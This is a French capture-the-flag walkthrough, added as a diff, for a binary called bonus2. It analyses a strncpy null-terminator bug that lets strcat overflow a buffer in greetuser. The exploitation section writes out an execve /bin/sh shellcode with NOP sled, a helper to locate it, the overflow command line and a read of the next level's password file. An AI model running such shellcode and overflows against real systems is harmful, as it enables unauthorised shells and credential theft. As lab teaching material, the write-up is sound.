@@ -1,0 +1,35 @@
+# Walkthrough — bonus2
+
+## 1) Contexte & objectifs
+- Objectif : provoquer un buffer overflow dans `greetuser` via un défaut de délimitation de chaîne (`\0`) et exécuter un shellcode contenu dans l'environnement.
+- Fichier / binaire : `bonus2`.
+- Contexte : le binaire prend deux arguments concaténés et utilise la variable d'environnement `LANG` pour définir et formater une salutation via `strcat()`.
+
+## 2) Analyse & vulnérabilité
+- Analyse statique :
+	- `main` effectue deux `strncpy` successifs : `strncpy(local_60, argv[1], 40)` et `strncpy(acStack_38, argv[2], 32)`.
+	- La fonction `strncpy` n'ajoute pas de `\0` si la limite indiquée (40) est atteinte.
+	- Les variables `local_60` et `acStack_38` étant adjacentes, si `argv[1]` fait exactement 40 caractères, les deux arguments sont lus comme une seule grande chaîne.
+	- Le programme assigne une variable globale `language` selon `LANG` (`LANG=nl` -> 2, `LANG=fi` -> 1).
+	- Ensuite, `greetuser` prépare une salutation selon la langue et la concatène avec notre grande chaîne à l'aide de `strcat()`.
+- Analyse dynamique :
+	- Dans `greetuser`, le buffer global fait environ 72 octets de long.
+	- Avec `LANG=nl`, la chaîne `"Goedemiddag! "` (14 caractères) est injectée au début.
+	- L'absence de caractère nul entraîne la vraie copie totale de nos arguments : 14 caractères (salutation) + 40 octets (arg1) = 54. Il reste 18 caractères avant d'overflow les 72 octets, plus 4 octets de l'EBP.
+	- En testant avec gdb, on remarque que l'EIP se met à être écrasé exactement à l'offset 23 de notre deuxième argument (`argv[2]`).
+- Vulnérabilité : buffer overflow dans `greetuser` dû à une perte de la délimitation de la chaîne (absence de `\0`) dans `strncpy()`.
+
+## 3) Exploitation & flag
+- Étapes :
+	- Placer le shellcode (NOP sled + instructions) dans l'environnement.
+	- Trouver son adresse de base en mémoire avec un petit programme C (`/tmp/find`).
+	- Préparer le premier argument avec 40 caractères `"A"` pour saturer sans `\0`.
+	- Préparer le second argument avec 23 caractères `"B"` de remplissage (padding), suivi de l'adresse du shellcode.
+	- Lancer le programme avec `LANG=nl`.
+- Commandes utilisées :
+	- `export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')`
+	- `echo 'int main() { printf("0x%x\n", getenv("SHELLCODE")); }' > /tmp/find.c && gcc /tmp/find.c -o /tmp/find`
+	- `env LANG=nl SHELLCODE=$SHELLCODE /tmp/find`
+	- `LANG=nl ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*23 + "\x3a\xfb\xff\xbf"')`
+- Exécution de commandes :
+	- `cat /home/user/bonus3/.pass`
